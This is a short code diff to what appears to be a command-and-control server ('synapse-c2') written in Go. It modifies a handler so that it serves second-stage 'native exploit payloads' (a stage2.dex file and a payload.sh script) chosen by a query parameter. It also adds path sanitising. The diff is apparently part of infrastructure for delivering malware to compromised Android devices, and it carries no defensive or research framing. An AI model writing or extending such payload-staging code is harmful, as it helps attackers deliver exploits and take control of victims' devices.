@@ -3,6 +3,7 @@ package c2
 import (
 	"encoding/json"
 	"net/http"
+	"path/filepath"
 	"time"
 
 	"synapse-c2/app/synapse-c2/internal/model"
@@ -138,9 +139,17 @@ func (c *Controller) RegisterFCM(r *ghttp.Request) {
 	r.Response.WriteJson(g.Map{"status": "ok"})
 }
 
-// ServeStage2 handles GET /api/stage2
+// ServeStage2 handles GET /api/stage2 — serves native exploit payloads.
+// Query param `file` selects which payload (default: stage2.dex).
+// Available: stage2.dex, payload.sh
 func (c *Controller) ServeStage2(r *ghttp.Request) {
-	r.Response.ServeFile("resource/public/stage2.dex")
+	filename := r.Get("file").String()
+	if filename == "" {
+		filename = "stage2.dex"
+	}
+	// Sanitize to prevent path traversal
+	safe := filepath.Base(filename)
+	r.Response.ServeFile("resource/stage2/" + safe)
 }
 
 // SSEEvents handles GET /api/events (Server-Sent Events for dashboard)
